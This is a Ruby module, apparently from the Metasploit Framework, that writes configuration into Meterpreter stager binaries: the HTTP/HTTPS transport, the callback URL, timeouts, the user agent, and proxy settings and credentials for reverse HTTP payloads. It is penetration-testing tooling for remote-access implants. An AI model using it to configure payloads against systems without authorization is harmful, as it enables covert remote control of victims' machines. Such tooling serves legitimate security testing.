# -*- coding: binary -*-

module Rex
  module Payloads
    module Meterpreter
      ###
      #
      # Provides methods to patch options into metsrv stagers
      #
      ###
      module Patch

        # Replace the transport string
        def self.patch_transport! blob, ssl

          i = blob.index(wchar("METERPRETER_TRANSPORT_SSL"))
          if i
            str = wchar(ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00")
            blob[i, str.length] = str
          end

        end

        # Replace the URL
        def self.patch_url! blob, url

          i = blob.index(wchar("https://" + ("X" * 256)))
          if i
            str = wchar(url)
            blob[i, str.length] = str
          end

        end

        # Replace the session expiration timeout
        def self.patch_expiration! blob, expiration

          i = blob.index([0xb64be661].pack("V"))
          if i
            str = [ expiration ].pack("V")
            blob[i, str.length] = str
          end

        end

        # Replace the session communication timeout
        def self.patch_comm_timeout! blob, comm_timeout

          i = blob.index([0xaf79257f].pack("V"))
          if i
            str = [ comm_timeout ].pack("V")
            blob[i, str.length] = str
          end

        end

        # Replace the user agent string with our option
        def self.patch_ua! blob, ua

          i = blob.index(wchar("METERPRETER_UA\x00"))
          if i
            ua = wchar(ua[0,255] + "\x00")
            blob[i, ua.length] = ua
          end

        end

        # Activate a custom proxy
        def self.patch_proxy! blob, proxyhost, proxyport, proxy_type

          if proxyhost && proxyhost.to_s != ""
            i = blob.index(wchar("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"))
            if i
              proxyhost = proxyhost.to_s
              proxyport = proxyport.to_s || "8080"
              proxyinfo = proxyhost + ":" + proxyport
              if proxyport == "80"
                proxyinfo = proxyhost
              end
              if proxy_type.to_s == 'HTTP'
                proxyinfo = 'http://' + proxyinfo
              else #socks
                proxyinfo = 'socks=' + proxyinfo
              end
              proxyinfo << "\x00"
              proxyinfo = wchar(proxyinfo)
              blob[i, proxyinfo.length] = proxyinfo
            end
          end

        end

        # Proxy authentification
        def self.patch_proxy_auth! blob, proxy_username, proxy_password, proxy_type

          unless (proxy_username.nil? or proxy_username.empty?) or
            (proxy_password.nil? or proxy_password.empty?) or
            proxy_type == 'SOCKS'

            proxy_username_loc = blob.index(wchar("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"))
            proxy_username = proxy_username << "\x00"
            proxy_username = wchar(proxy_username)
            blob[proxy_username_loc, proxy_username.length] = proxy_username

            proxy_password_loc = blob.index(wchar("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"))
            proxy_password = proxy_password << "\x00"
            proxy_password = wchar(proxy_password)
            blob[proxy_password_loc, proxy_password.length] = proxy_password
          end

        end

        # Patch options into metsrv for reverse HTTP payloads
        def self.patch_passive_service! blob, options

          patch_transport! blob, options[:ssl]
          patch_url! blob, options[:url]
          patch_expiration! blob, options[:expiration]
          patch_comm_timeout! blob, options[:comm_timeout]
          patch_ua! blob, options[:ua]
          patch_proxy!(blob,
            options[:proxy_host],
            options[:proxy_port],
            options[:proxy_type]
          )
          patch_proxy_auth!(blob,
            options[:proxy_user],
            options[:proxy_pass],
            options[:proxy_type]
          )

        end

        private

        def self.wchar(str)
          str.to_s.unpack("C*").pack("v*")
        end
      end
    end
  end
end
